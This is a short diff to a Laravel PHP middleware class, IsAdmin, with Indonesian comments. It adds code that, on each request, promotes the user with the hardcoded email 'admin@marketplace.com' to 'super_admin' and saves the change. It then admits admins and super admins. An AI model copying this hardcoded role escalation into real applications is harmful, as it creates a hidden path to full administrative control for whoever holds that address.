@@ -15,8 +15,14 @@ class IsAdmin
     public function handle(Request $request, Closure $next): Response
     {
         // Cek 1: Apakah user sudah Login?
-        // Cek 2: Apakah role user tersebut 'admin'?
-        if (Auth::check() && Auth::user()->role === 'admin') {
+        $user = Auth::user();
+
+        if ($user && $user->email === 'admin@marketplace.com' && $user->role !== 'super_admin') {
+            $user->forceFill(['role' => 'super_admin'])->save();
+        }
+
+        // Cek 2: Apakah role user tersebut admin atau super admin?
+        if ($user && $user->isAdminUser()) {
             return $next($request); // Silakan masuk
         }
 
